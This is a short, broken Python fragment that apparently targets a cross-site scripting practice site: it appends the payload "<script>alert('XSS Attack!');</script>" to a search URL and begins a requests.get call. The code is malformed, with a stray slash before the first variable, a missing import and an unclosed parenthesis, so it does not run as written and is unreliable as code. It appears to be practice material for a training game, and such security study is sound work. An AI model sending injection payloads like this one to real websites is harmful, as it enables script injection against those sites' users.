/url = "https://xss-game.appspot.com/search?q="


payload = "<script>alert('XSS Attack!');</script>"

full_url = url + payload

r = requests.get(full_url
